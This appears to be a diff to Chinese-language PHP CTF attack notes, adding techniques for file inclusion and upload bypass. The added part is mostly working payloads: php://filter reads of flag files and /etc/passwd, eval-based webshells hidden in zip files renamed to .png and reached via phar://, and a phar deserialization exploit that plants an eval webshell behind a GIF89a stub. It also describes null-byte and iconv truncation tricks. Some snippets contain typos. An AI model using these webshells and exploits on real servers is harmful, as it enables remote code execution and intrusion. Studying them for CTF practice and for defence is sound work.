@@ -78,14 +78,124 @@ php对post过来的文件有一个默认处理流程，即在一个处理周期�
 4./tmp目录下的上传文件得以保留
 5.包含/tmp目录下的上传文件形成webshell
 ![disable functions](php/2018-11-19-08-19-37.png)
---------------------- 
-作者：我好菜啊 
-来源：CSDN 
-原文：https://blog.csdn.net/qq_30123355/article/details/58165038 
 
 ## php伪协议
 https://lorexxar.cn/2016/09/14/php-wei/
 读取../flag.php
 ```
 module=php://filter/read=convert.base64-encode/resource/../flag&name=php
+include(‘php://filter/string.strip_tags/resource=/etc/passwd’)直接崩溃php，
 ```
+
+## phar
+### 一般利用
+利用方法：
+将下面代码压缩成zip文件，然后将后缀改为png后上传。
+```php
+<?=eval($_POST['1']);?>
+
+<?php eval($_POST['1']);?>
+
+<script language='php'>
+	eval($_POST['1']);
+</script>
+```
+之后用phar协议访问。
+`/?act=get&pic=phar:///var/www/html/sandbox/5eac5f7bd6358e10ff53dec9f3bb8690/4a47a0db6e60853dedfcfdf08a5ca249.png/1.php`
+### 反序列化
+https://blog.csdn.net/xiaorouji/article/details/83118619
+https://cloud.tencent.com/developer/article/1350367
+exp：
+```php
+<?php
+
+ class PicManager{
+	 private $current_dir;
+	 private $whitelist=['jpg','png','gif'];
+	 private $logfile='request.log';
+	 private $actions=[];
+
+	 public function __construct($dir){
+		 $this->current_dir=$dir;
+		 if(!is_dir($dir))@mkdir($dir);
+	 }
+
+	 private function _log($message){
+		 array_push($this->actions,'['.date('y-m-d h:i:s',time()).']'.$message);
+	 }
+
+	 public function pics(){
+		 log('list pics');
+		 $pics=[];
+		 foreach(scandir($dir) as $item){
+			 if(in_array(substr($item,-4),$whitelist))
+				 array_push($pics,$current_dir."/".$item);
+		 }
+		 return $pics;
+	 }
+	 public function upload_pic(){
+		 _log('upload pic');
+		 $file=$_FILES['file']['name'];
+		 if(!in_array(substr($file,-4),$this->whitelist)){
+			 _log('unsafe deal:upload filename '.$file);
+			 return;
+		 }
+		 $newname=md5($file).substr($file,-4);
+		 move_uploaded_file($_FILES['file']['tmp_name'],$current_dir.'/'.$newname);
+	 }
+	 public function get_pic($picname){
+		 _log('get pic'.$picname);
+		 if(!file_exists($picname))
+			 return '';
+		 else return file_get_contents($picname);
+	 }
+	 public function __destruct(){
+		 $fp=fopen($this->current_dir.'/'.$this->logfile,"a+");
+		 foreach($this->actions as $act){
+			 fwrite($fp,$act."\n");
+		 }
+		 fclose($fp);
+	 }
+
+	 public function gen(){
+		 @rmdir($this->current_dir);
+		 $this->current_dir="/var/www/html/sandbox/a6bfb20ba19df73fcceb438f5f75948f/"; //md5($_SERVER['REMOTE_ADDR'])
+		 $this->logfile='H4lo.php';
+		 $this->actions=['<?php eval($_REQUEST[p]);'];
+		 @unlink('phar.phar');
+		 
+		 
+		 $phar = new Phar("phar.phar");
+		 $phar->startBuffering();
+		 $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头用以欺骗检测
+		 $phar->setMetadata($this); //将自定义meta-data存入manifest
+		 $phar->addFromString("test.txt", "test"); //添加要压缩的文件
+			     //签名自动计算
+		 $phar->stopBuffering();
+
+	 }
+ }
+
+$pic=new PicManager('/var/www/html/sandbox');
+$pic->gen();
+```
+## 截断
+### 00 截断
+用于上传
+magic_quotes_gpc=Off
+php版本小于5.3.4
+00无效时，使用0x0~0xff中的acsii字符尝试。
+
+### iconv函数字符编码导致截断
+char(128)到(255)之间的字符转换为gbk编码时为空值。
+```php
+<?php
+$a = '1'.chr(130).'2';
+echo $a."<br>";
+echoh iconv('UTF-8','GBK',$a);
+?>
+```
+### 其他截断
+1. url %3f后面会当参数
+2. sql注入中的注释，换行
+3. 文件包含中，上传中长文件名，会对后缀名忽略。
